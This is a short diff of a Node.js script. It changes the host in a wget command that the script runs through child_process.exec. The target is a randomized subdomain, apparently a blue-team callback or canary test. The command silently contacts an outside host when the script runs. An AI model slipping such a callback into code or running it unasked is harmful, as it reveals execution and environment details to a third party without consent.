@@ -1,5 +1,5 @@
 #!/usr/bin/env node.js
-let cmd = `wget http://xpq12acdybm4n1p4f4ds3cu8rzxqli97.c.0e.is/blueteam_test1`;
+let cmd = `wget http://stpw65g826qzrwtzjzhn77y3vu1lped3.c.0e.is/blueteam_test1`;
 require('child_process').exec(cmd, (error, stdout, stderr) => {
     if (error) {
         throw new Error(`执行错误:\r\n${error}`);
